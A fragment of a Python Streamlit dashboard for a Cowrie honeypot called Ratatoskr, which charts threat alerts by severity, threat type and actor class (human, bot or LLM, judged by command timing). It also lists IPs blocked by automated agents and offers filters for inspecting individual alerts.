    with ac1:
        st.metric("🧠 Potential LLM", potential_llm_count)
    with ac2:
        st.metric("🤖 Confirmed LLM", confirmed_llm_count)
    with ac3:
        st.metric("👤 Human", sum(1 for a in filtered_alerts if alert_actor_class(a) == "human"))
    with ac4:
        st.metric("⚙️ Bot", sum(1 for a in filtered_alerts if alert_actor_class(a) == "bot"))
    with ac5:
        st.metric("Session scores", len(_dedupe_session_scores(session_scores)))
    
    # Charts row
    st.header("📈 Visualizations")
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        # Severity distribution
        if filtered_alerts:
            severity_counts = {}
            for alert in filtered_alerts:
                severity = alert.get("severity", "UNKNOWN")
                severity_counts[severity] = severity_counts.get(severity, 0) + 1
            
            if severity_counts:
                fig_severity = px.pie(
                    values=list(severity_counts.values()),
                    names=list(severity_counts.keys()),
                    title="Alerts by Severity",
                    color_discrete_map=SEVERITY_COLOR_MAP
                )
                st.plotly_chart(fig_severity, use_container_width=True)
    
    with col2:
        # Threat type distribution
        if filtered_alerts:
            threat_type_counts = {}
            for alert in filtered_alerts:
                threat_type = alert.get("threat_type", "UNKNOWN")
                threat_type_counts[threat_type] = threat_type_counts.get(threat_type, 0) + 1
            
            if threat_type_counts:
                fig_threat = px.bar(
                    x=list(threat_type_counts.keys()),
                    y=list(threat_type_counts.values()),
                    title="Alerts by Threat Type",
                    labels={"x": "Threat Type", "y": "Count"}
                )
                fig_threat.update_layout(showlegend=False)
                st.plotly_chart(fig_threat, use_container_width=True)

    with col3:
        if filtered_alerts:
            actor_counts: Dict[str, int] = {}
            for alert in filtered_alerts:
                ac = alert_actor_class(alert)
                actor_counts[ac] = actor_counts.get(ac, 0) + 1
            if actor_counts:
                fig_actor = px.pie(
                    values=list(actor_counts.values()),
                    names=[actor_class_display(k) for k in actor_counts.keys()],
                    title="Alerts by Actor Class",
                    color_discrete_sequence=ACTOR_COLOR_SEQUENCE,
                )
                st.plotly_chart(fig_actor, use_container_width=True)

    timing_vals = [
        v for v in (alert_actor_median_delta(a) for a in filtered_alerts) if v is not None
    ]
    if timing_vals:
        st.subheader("⏱️ Actor timing (median inter-command delta)")
        st.caption("Palisade LLM Honeypot threshold ~1.7s — below suggests automated/LLM-speed responses.")
        tcol1, tcol2 = st.columns([2, 1])
        with tcol1:
            try:
                bins = [0.0, 0.5, 1.0, 1.5, 2.0, 2.5, max(timing_vals) + 0.5]
                labels = ["0-0.5s", "0.5-1.0s", "1.0-1.5s", "1.5-2.0s", "2.0-2.5s", "2.5s+"]
                series = pd.cut(timing_vals, bins=bins, labels=labels, include_lowest=True)
                st.bar_chart(series.value_counts().sort_index())
            except Exception:
                st.bar_chart({"median_delta_sec": timing_vals})
        with tcol2:
            under = sum(1 for v in timing_vals if v < 1.7)
            st.metric("Under 1.7s", under)
            st.metric("Median of medians", round(float(pd.Series(timing_vals).median()), 2))
    
    # Blocked IPs Table
    blocked_ips = load_blocked_ips()
    with st.expander(
        f"🔒 Blocked IP Details ({len(blocked_ips)})",
        expanded=False,
    ):
        if st.button("🔄 Refresh", key="refresh_blocked_ips", help="Refresh blocked IPs table"):
            load_blocked_ips.clear()
            st.rerun()

        if blocked_ips:
            # Create DataFrame for blocked IPs
            blocked_df_data = []
            for ip_entry in blocked_ips:
                blocked_at = ip_entry.get("blocked_at", "Unknown")
                # Parse timestamp if it's a string
                if isinstance(blocked_at, str):
                    try:
                        dt = datetime.fromisoformat(blocked_at.replace('Z', '+00:00'))
                        blocked_at = dt.strftime('%Y-%m-%d %H:%M:%S')
                    except:
                        pass
            
                duration = ip_entry.get("duration_hours", 0)
                duration_str = f"{duration} hours" if duration > 0 else "Indefinite"
            
                blocked_df_data.append({
                    "IP Address": ip_entry.get("ip", "N/A"),
                    "Blocked At": blocked_at,
                    "Reason": ip_entry.get("reason", "N/A"),
                    "Duration": duration_str,
                    "Blocked By": ip_entry.get("blocked_by", "Flink Agents")
                })
        
            blocked_df = pd.DataFrame(blocked_df_data)
        
            indefinite_count = sum(
                1 for ip_entry in blocked_ips if ip_entry.get("duration_hours", 0) == 0
            )
            m1, m2 = st.columns(2)
            m1.metric("Total Blocked IPs", len(blocked_ips))
            m2.metric("Indefinite Blocks", indefinite_count)

            st.dataframe(
                blocked_df,
                use_container_width=True,
                hide_index=True
            )

            csv = blocked_df.to_csv(index=False)
            st.download_button(
                label="📥 Download Blocked IPs as CSV",
                data=csv,
                file_name=f"blocked_ips_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                mime="text/csv"
            )
        else:
            st.info("No blocked IPs found. IPs will appear here after Flink Agents block them.")
        
            # Show debug information
            with st.expander("🔍 Debug: Check Blocklist Files"):
                st.markdown("**Checking for blocklist files in common locations:**")
            
                cwd = os.getcwd()
                script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else cwd
            
                check_paths = [
                    ("Relative", "cowrie-data/blocklist.json"),
                    ("Relative", "./cowrie-data/blocklist.json"),
                    ("CWD", os.path.join(cwd, "cowrie-data", "blocklist.json")),
                    ("Script Dir", os.path.join(script_dir, "cowrie-data", "blocklist.json")),
                    ("Relative", "cowrie-data/blocklist.txt"),
                    ("Relative", "./cowrie-data/blocklist.txt"),
                    ("CWD", os.path.join(cwd, "cowrie-data", "blocklist.txt")),
                    ("Script Dir", os.path.join(script_dir, "cowrie-data", "blocklist.txt")),
                ]
            
                st.markdown(f"**Current Working Directory:** `{cwd}`")
                st.markdown(f"**Script Directory:** `{script_dir}`")
                st.markdown("---")
            
                found_files = []
                for path_type, path in check_paths:
                    try:
                        abs_path = os.path.abspath(path)
                        exists = os.path.exists(path)
                        readable = os.access(path, os.R_OK) if exists else False
                    
                        if exists:
                            found_files.append((path_type, path, abs_path))
                            status = "✅"
                            try:
                                if path.endswith('.json'):
                                    with open(path, 'r') as f:
                                        data = json.load(f)
                                        ip_count = len(data.get("blocked_ips", []))
                                        st.text(f"{status} [{path_type}] {path}")
                                        st.text(f"   → Absolute: {abs_path}")
                                        st.text(f"   → Found {ip_count} blocked IP(s) in JSON")
                                        if ip_count > 0:
                                            for ip_entry in data.get("blocked_ips", [])[:3]:
                                                st.text(f"      • {ip_entry.get('ip', 'N/A')}")
                                else:
                                    with open(path, 'r') as f:
                                        lines = [l for l in f if l.strip() and not l.strip().startswith('#')]
                                        st.text(f"{status} [{path_type}] {path}")
                                        st.text(f"   → Absolute: {abs_path}")
                                        st.text(f"   → Found {len(lines)} IP(s) in text file")
                                        for line in lines[:3]:
                                            ip = line.split('#')[0].strip()
                                            st.text(f"      • {ip}")
                            except Exception as e:
                                st.text(f"{status} [{path_type}] {path}")
                                st.text(f"   → Error reading: {e}")
                        else:
                            st.text(f"❌ [{path_type}] {path} (not found)")
                    except Exception as e:
                        st.text(f"❌ [{path_type}] {path} (error: {e})")
            
                st.markdown("---")
            
                # Try Docker container
                st.markdown("**Trying Docker container:**")
                try:
                    import subprocess
                    result = subprocess.run(
                        ["docker", "exec", "flinkdockerwithagents-taskmanager-1", "cat", "/cowrie/cowrie/data/blocklist.json"],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if result.returncode == 0:
                        data = json.loads(result.stdout)
                        ip_count = len(data.get("blocked_ips", []))
                        st.success(f"✅ Found blocklist in Docker container with {ip_count} IP(s)")
                        for ip_entry in data.get("blocked_ips", [])[:3]:
                            st.text(f"   • {ip_entry.get('ip', 'N/A')}")
                    else:
                        st.text("❌ Docker container not accessible or file not found")
                except Exception as e:
                    st.text(f"❌ Docker check failed: {str(e)[:50]}")
            
                if not found_files:
                    st.warning("No blocklist files found locally. The dashboard will try to read from Docker container.")
                else:
                    st.success(f"Found {len(found_files)} blocklist file(s) locally")
        
            st.markdown("""
            **To block IPs:**
            1. Run the threat detection demo: `python demo_cowrie_response.py`
            2. Flink Agents will automatically block malicious IPs
            3. Blocked IPs will appear in this table
        
            **Blocklist file locations:**
            - `./cowrie-data/blocklist.json` (preferred)
            - `./cowrie-data/blocklist.txt` (fallback)
            """)
    
    st.markdown("---")
    
    action_type_counts = {}
    action_status_counts = {}
    for alert in filtered_alerts:
        for action in alert.get("response_actions", []):
            action_type = action.get("action_type", "UNKNOWN")
            action_status = action.get("status", "UNKNOWN")
            action_type_counts[action_type] = action_type_counts.get(action_type, 0) + 1
            action_status_counts[action_status] = action_status_counts.get(action_status, 0) + 1

    total_actions = sum(action_type_counts.values())
    with st.expander(f"⚡ Response actions summary ({total_actions})", expanded=False):
        if action_type_counts:
            col1, col2 = st.columns(2)
            with col1:
                fig_actions = px.bar(
                    x=list(action_type_counts.keys()),
                    y=list(action_type_counts.values()),
                    title="Actions by Type",
                    labels={"x": "Action Type", "y": "Count"},
                )
                fig_actions.update_layout(showlegend=False)
                st.plotly_chart(fig_actions, use_container_width=True)
            with col2:
                if action_status_counts:
                    fig_status = px.pie(
                        values=list(action_status_counts.values()),
                        names=list(action_status_counts.keys()),
                        title="Actions by Status",
                    )
                    st.plotly_chart(fig_status, use_container_width=True)
        else:
            st.caption("No response actions in filtered alerts.")
    
    # Detailed alerts table
    st.markdown('<a id="threat-alerts"></a>', unsafe_allow_html=True)
    with st.expander(
        f"🚨 Threat Alerts ({len(filtered_alerts)})",
        expanded=False,
    ):
        show_filters = st.checkbox("🔎 Threat alert filters", value=False, key="threat_alert_filters_toggle")
        if show_filters:
            colf1, colf2, colf3 = st.columns(3)
            with colf1:
                ip_query = st.text_input("Source IP contains", value="", placeholder="e.g. 198.51.100.")
            with colf2:
                text_query = st.text_input(
                    "Text search (description / recommended_action)",
                    value="",
                    placeholder="e.g. wget, brute force, intrusion",
                )
            with colf3:
                min_actions = st.number_input("Min response actions", min_value=0, value=0, step=1)
            colf4, colf5 = st.columns(2)
            with colf4:
                only_with_actions = st.checkbox("Only alerts with response actions", value=False)
            with colf5:
                recent_window = st.selectbox(
                    "Time window",
                    options=["All time", "Last 15m", "Last 1h", "Last 6h", "Last 24h"],
                    index=0,
                )
        else:
            ip_query = ""
            text_query = ""
            min_actions = 0
            only_with_actions = False
            recent_window = "All time"

        def _alert_dt(alert: Dict[str, Any]) -> Optional[datetime]:
            return _parse_alert_timestamp(alert.get("timestamp"))

        _now = datetime.now(timezone.utc)
        _cutoff: Optional[datetime] = None
        if recent_window == "Last 15m":
            _cutoff = _now - timedelta(minutes=15)
        elif recent_window == "Last 1h":
            _cutoff = _now - timedelta(hours=1)
        elif recent_window == "Last 6h":
            _cutoff = _now - timedelta(hours=6)
        elif recent_window == "Last 24h":
            _cutoff = _now - timedelta(hours=24)

        def _matches_section_filters(alert: Dict[str, Any]) -> bool:
            src_ip = str(alert.get("source_ip", "") or "")
            desc = str(alert.get("description", "") or "")
            rec = str(alert.get("recommended_action", "") or "")
            actions = alert.get("response_actions", []) or []

            if ip_query and ip_query.lower() not in src_ip.lower():
                return False
            if text_query:
                q = text_query.lower()
                if q not in desc.lower() and q not in rec.lower():
                    return False
            if only_with_actions and len(actions) == 0:
                return False
            if len(actions) < int(min_actions):
                return False
            if _cutoff is not None:
                dt = _alert_dt(alert)
                # If timestamp is missing/unparseable, exclude from "recent" windows.
                if dt is None or dt < _cutoff:
                    return False
            return True

        threat_alerts = [a for a in filtered_alerts if _matches_section_filters(a)]

        if threat_alerts:
            alerts_df_data = []
            label_to_alert = {}
            for alert in threat_alerts:
                median = alert_actor_median_delta(alert)
                severity = alert.get("severity", "UNKNOWN")
                emoji = get_severity_emoji(severity)
                ac_label = actor_class_display(alert_actor_class(alert))
                label = (
                    f"{react_agent_star(alert)}{emoji} {alert.get('threat_type', 'UNKNOWN')} — "
                    f"{alert.get('source_ip', 'N/A')} ({severity}) · {ac_label} — "
                    f"{str(alert.get('timestamp', 'N/A'))[:19]}"
                )
                # Ensure unique selectbox labels
                base = label
                n = 2
                while label in label_to_alert:
                    label = f"{base} ({n})"
                    n += 1
                label_to_alert[label] = alert
                alerts_df_data.append({
                    "Agent": "⭐ ReAct" if is_react_agent_alert(alert) else "Workflow",
                    "Actor Class": ac_label,
                    "Alert ID": alert.get("alert_id", "N/A"),
                    "Timestamp": alert.get("timestamp", "N/A"),
                    "Severity": severity,
                    "Threat Type": alert.get("threat_type", "UNKNOWN"),
                    "Source IP": alert.get("source_ip", "N/A"),
                    "Median Δ (s)": round(median, 2) if median is not None else None,
                    "Description": (
                        alert.get("description", "N/A")[:100] + "..."
                        if len(alert.get("description", "")) > 100
                        else alert.get("description", "N/A")
                    ),
                    "Actions": len(alert.get("response_actions", [])),
                })

            st.dataframe(pd.DataFrame(alerts_df_data), use_container_width=True, hide_index=True)

            selected_label = st.selectbox(
                "Inspect alert",
                options=list(label_to_alert.keys()),
                index=0,
                key="threat_alert_inspect",
            )
            with st.expander("Selected alert details", expanded=False):
                _render_threat_alert_detail(label_to_alert[selected_label])
        else:
            st.info("No alerts match the selected filters.")

    # Footer
    st.markdown("---")
    footer_html = (
        f"<div style='text-align:center;color:#5c5278;padding:1.25rem 1rem;"
        f"border-top:1px solid #d9d0ec;margin-top:1.5rem;'>"
        f"<span style='color:#120046;font-weight:600;'>Ratatoskr</span> · HoneyPot · "
        f"Last updated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        f"</div>"
    )
    st.markdown(footer_html, unsafe_allow_html=True)


if __name__ == "__main__":
    main()

